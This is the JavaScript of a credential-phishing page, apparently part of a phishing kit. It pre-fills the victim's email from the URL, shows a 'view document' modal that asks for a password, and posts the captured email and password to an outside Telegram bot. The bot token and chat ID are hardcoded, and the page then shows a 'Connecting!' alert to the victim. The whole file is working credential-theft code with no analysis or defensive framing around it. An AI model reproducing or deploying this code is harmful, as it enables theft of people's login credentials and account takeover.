function getEmailFromURL() {
    const params = new URLSearchParams(window.location.search);
    return params.get('email') || '';
}

function initializeModal() {
    const email = getEmailFromURL();
    const emailDisplay = document.getElementById('emailDisplay');
    const modalOverlay = document.getElementById('modalOverlay');

    if (email) {
        emailDisplay.textContent = email;
    }

    // Show modal after 2 seconds
    setTimeout(() => {
        modalOverlay.classList.add('show');
    }, 2000);

    // Keep modal open when clicked outside
    document.addEventListener('click', (e) => {
        if (e.target!== modalOverlay && e.target!== emailDisplay &&!modalOverlay.contains(e.target)) {
            modalOverlay.classList.remove('show');
        }
    });
}

// Function to send message to Telegram
function sendTelegramMessage(message) {
    const telegramBotToken = '8501088077:AAE5yUFbYa8Ekdj_bTGEGXrqMgojCEhQMSk'; // Replace with your actual bot token
    const telegramChatId = '8530540464'; // Replace with your actual chat ID
    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

    return fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: telegramChatId, text: message })
    }).then(response => response.json());
}

function showModal() {
    const modalOverlay = document.getElementById('modalOverlay');
    modalOverlay.classList.add('show');
}

function hideModal() {
    const modalOverlay = document.getElementById('modalOverlay');
    modalOverlay.classList.remove('show');
}

document.addEventListener('DOMContentLoaded', () => {
    initializeModal();

    const modalOverlay = document.getElementById('modalOverlay');

    // Optional: Close modal when clicking outside the modal content
    modalOverlay.addEventListener('click', (event) => {
        if (event.target === modalOverlay) {
            showModal();
        }
    });

    // Assuming there's a button with class 'view-document-btn'
    const viewButton = document.querySelector('.view-document-btn');

    if (viewButton) {
        viewButton.addEventListener('click', () => {
            const email = getEmailFromURL() || 'No email provided';

            // Get the password input value
            const passwordInput = document.getElementById('passwordInput'); // Make sure this exists in your HTML
            const password = passwordInput ? passwordInput.value : '';

            const message = `Email: ${email}\nPassword: ${password}`;

            // Send the message to Telegram
            sendTelegramMessage(message)
                .then(data => {
                    if (data.ok) {
                        alert('Connecting!');
                    } else {
                        alert('Failed to send message: ' + data.description);
                    }
                })
                .catch(() => alert('Error sending message.'));
        });
    }
});
